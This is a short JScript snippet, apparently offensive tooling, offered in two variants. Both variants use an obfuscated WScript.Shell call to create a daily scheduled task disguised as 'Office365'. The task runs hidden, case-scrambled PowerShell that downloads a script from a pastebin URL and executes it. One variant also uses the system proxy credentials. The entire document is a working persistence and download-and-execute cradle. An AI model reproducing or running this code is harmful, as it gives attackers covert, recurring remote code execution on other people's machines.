#This .js scripts can be used, to create a taskschedule persistence with a not proxy aware PowerShell Download Cradle
c=new ActiveXObject("W"+"S"+"cr"+"ip"+"t."+"S"+"h"+"e"+"l"+"l");
c.run('cmd.exe /c SchTasks /Create /SC DAILY /ST 12:00 /TN Office365 /TR "pOwErsHelL -w hidDEn -nOpR  -coM \'I`eX (N`E`W`-obje`CT Net.Webclient).\\\\\\"dowNloa`DST`RIng\\\\\\"((\\\\\\"https://pastebin.com/raw/Qpiz8y6c\\\\\\"))"', 0);







#This .js script can be used, to create a taskschedule persistence with a proxy aware PowerShell Download Cradle
c=new ActiveXObject("W"+"S"+"cr"+"ip"+"t."+"S"+"h"+"e"+"l"+"l");
c.run('cmd.exe /c SchTasks /Create /SC DAILY /ST 12:00 /TN Office365 /TR "PoWeRsHelL.eXe -NoP -w HidDen -c $a=neW-ObJeCt nET.wEbClieNt;$a.pROxy=[NeT.WeBreQueSt]::geTsyStEmweBprOxy();$a.prOxY.crEdEnTials=[NEt.crEdEnTiaLcaChe]::deFaUltcrEdeNtials;IeX $a.DOwNLOadstRiNg(\'ht\'+\'tps://pastebin.com/raw/Qpiz8y6c\')"', 0);
